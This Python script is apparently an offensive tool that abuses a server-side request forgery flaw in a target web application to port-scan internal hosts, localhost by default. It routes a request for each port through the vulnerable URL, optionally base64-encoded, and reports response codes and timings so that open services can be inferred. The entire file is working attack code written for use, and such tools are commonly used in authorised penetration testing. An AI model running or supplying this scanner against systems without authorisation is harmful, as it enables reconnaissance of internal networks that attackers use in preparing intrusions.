#!/usr/bin/python3
#ssrf portscan

import sys
import argparse
import requests
import signal
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
parser = argparse.ArgumentParser(description="ssrf portscan")
parser.add_argument("-p", dest="ports", required=False, help="Comma seperated ports to scan", default="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080")
parser.add_argument("-f", dest="filereq", required=False, help="File to request, defaults to /favicon.ico", default="/favicon.ico")
parser.add_argument("-t", dest="target", required=False, help="Target to scan, defaults to 127.0.0.1", default="127.0.0.1")
parser.add_argument("-m", dest="method", required=False, help="Define method, such as http://, netdoc:/// etc, defaults to https://", default="https://")
parser.add_argument("-b", dest="pldbase", required=False, action='store_true', help="Base64 the payload", default="False")
parser.add_argument("-s", dest="ssrfurl", required=True, help="SSRF Url", default="")
args = parser.parse_args()
port1 = args.ports
filereq = args.filereq
ssrfurl = args.ssrfurl
ports = port1.split(",")
target = args.target
baseit = args.pldbase
meth = args.method
col = ":"
def handler(signum, frame):
    res = input("Ctrl-c was pressed. Do you really want to exit? y/n ")
    if res == 'y':
        exit(1)

signal.signal(signal.SIGINT, handler)
print("[*] ssrf port scanner")
for port in ports:
    target2 = meth+target+col+port+filereq
    if baseit == True:
        b = base64.b64encode(bytes(target2, 'utf-8'))
        urlscan = ssrfurl + b.decode('utf-8')
        try:
            r = requests.get(urlscan, verify=False, timeout=7, allow_redirects=False)
#            print (r.text)
        except requests.exceptions.Timeout:
            print("[-]Response from "+target+":"+port+": Response Timeout")
            continue
        restime = str(r.elapsed.total_seconds())
        print("[-]Response from "+target+":"+port+": "+str(r)+" "+restime)

    else:
        urlscan = ssrfurl+target2
        try:
            r = requests.get(urlscan, verify=False, timeout=7, allow_redirects=False)
        except requests.exceptions.Timeout:
            print("[-]Response from "+target+":"+port+": Response Timeout")
            continue
        restime = str(r.elapsed.total_seconds())
        print("[-]Response code from "+target+":"+port+" : "+str(r)+" "+restime)
